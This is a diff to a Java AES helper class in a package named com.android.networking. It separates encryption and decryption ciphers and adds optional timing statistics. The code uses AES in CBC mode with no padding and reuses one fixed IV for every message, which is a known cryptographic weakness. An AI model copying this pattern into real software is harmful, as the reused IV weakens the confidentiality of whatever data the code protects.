@@ -12,6 +12,7 @@ package com.android.networking.crypto;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.util.Date;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -21,6 +22,7 @@ import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
 import com.android.networking.Messages;
+import com.android.networking.action.sync.Statistics;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 
@@ -46,7 +48,8 @@ public class Crypto {
 	private final IvParameterSpec ivSpec;
 
 	/** The cipher. */
-	Cipher cipher;
+	Cipher cipherEnc;
+	Cipher cipherDec;
 
 	/**
 	 * Instantiates a new crypto.
@@ -57,8 +60,24 @@ public class Crypto {
 	 *             the no such algorithm exception
 	 * @throws NoSuchPaddingException
 	 *             the no such padding exception
+	 * @throws InvalidAlgorithmParameterException
+	 * @throws InvalidKeyException
 	 */
-	public Crypto(final byte[] key) throws NoSuchAlgorithmException, NoSuchPaddingException {
+	public Crypto(final byte[] key, boolean encrypt) throws NoSuchAlgorithmException, NoSuchPaddingException,
+			InvalidKeyException, InvalidAlgorithmParameterException {
+		this(key);
+		// 17.1=AES/CBC/NoPadding
+		if (encrypt) {
+			cipherEnc = Cipher.getInstance(Messages.getString("17.1")); //$NON-NLS-1$
+			cipherEnc.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
+		} else {
+			cipherDec = Cipher.getInstance(Messages.getString("17.1")); //$NON-NLS-1$
+			cipherDec.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
+		}
+	}
+
+	public Crypto(final byte[] key) throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException,
+			InvalidAlgorithmParameterException {
 		aes_key = new byte[key.length];
 		System.arraycopy(key, 0, aes_key, 0, key.length);
 		// 17.0=AES
@@ -71,8 +90,12 @@ public class Crypto {
 		}
 
 		ivSpec = new IvParameterSpec(iv);
-		// 17.1=AES/CBC/NoPadding
-		cipher = Cipher.getInstance(Messages.getString("17.1")); //$NON-NLS-1$
+
+		cipherEnc = Cipher.getInstance(Messages.getString("17.1")); //$NON-NLS-1$
+		cipherEnc.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
+
+		cipherDec = Cipher.getInstance(Messages.getString("17.1")); //$NON-NLS-1$
+		cipherDec.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
 	}
 
 	/**
@@ -84,16 +107,37 @@ public class Crypto {
 	 * @throws Exception
 	 *             the exception
 	 */
-	public byte[] encrypt(final byte[] clear) throws Exception {
+	public byte[] encrypt(final byte[] plain) throws Exception {
+		Statistics statistics;
+		if (Cfg.STATISTICS) {
+			statistics = new Statistics("encrypt");
+			statistics.start(false);
+			statistics.addIn(plain.length);
+		}
 
-		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
-		final byte[] encrypted = cipher.doFinal(clear);
+		final byte[] encrypted = cipherEnc.doFinal(plain);
+		if (Cfg.STATISTICS) {
+			statistics.stop();
+		}
 		return encrypted;
 	}
 
-	public byte[] encrypt(byte[] plain, int offset) throws IllegalBlockSizeException, BadPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
-		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
-		final byte[] encrypted = cipher.doFinal(plain, offset, plain.length - offset);
+	public byte[] encrypt(byte[] plain, int offset) throws IllegalBlockSizeException, BadPaddingException,
+			InvalidKeyException, InvalidAlgorithmParameterException {
+
+		Statistics statistics;
+		if (Cfg.STATISTICS) {
+			statistics = new Statistics("encrypt");
+			statistics.start(false);
+			statistics.addIn(plain.length);
+		}
+
+		final byte[] encrypted = cipherEnc.doFinal(plain, offset, plain.length - offset);
+
+		if (Cfg.STATISTICS) {
+			statistics.stop();
+		}
+
 		return encrypted;
 	}
 
@@ -108,8 +152,17 @@ public class Crypto {
 	 */
 	public byte[] decrypt(final byte[] encrypted) throws Exception {
 		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
-		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
-		final byte[] decrypted = cipher.doFinal(encrypted);
+
+		Statistics statistics;
+		if (Cfg.STATISTICS) {
+			statistics = new Statistics("decrypt");
+			statistics.start(false);
+			statistics.addIn(encrypted.length);
+		}
+		final byte[] decrypted = cipherDec.doFinal(encrypted);
+		if (Cfg.STATISTICS) {
+			statistics.stop();
+		}
 		return decrypted;
 	}
 
@@ -120,7 +173,7 @@ public class Crypto {
 	 *            the encrypted
 	 * @param offset
 	 *            the offset
-	 * @param offset2 
+	 * @param offset2
 	 * @return the byte[]
 	 * @throws Exception
 	 *             the exception
@@ -130,13 +183,21 @@ public class Crypto {
 			return null;
 		}
 
-		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
-		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
-		byte[] plain= cipher.doFinal(encrypted, offset, encrypted.length - offset );
+		Statistics statistics;
+		if (Cfg.STATISTICS) {
+			statistics = new Statistics("decrypt");
+			statistics.start(false);
+			statistics.addIn(encrypted.length);
+		}
+
+		byte[] plain = cipherDec.doFinal(encrypted, offset, encrypted.length - offset);
+		if (Cfg.STATISTICS) {
+			statistics.stop();
+		}
 		byte[] dst = new byte[plainlen];
 		System.arraycopy(plain, 0, dst, 0, plainlen);
 		return dst;
-		
+
 	}
 
 }
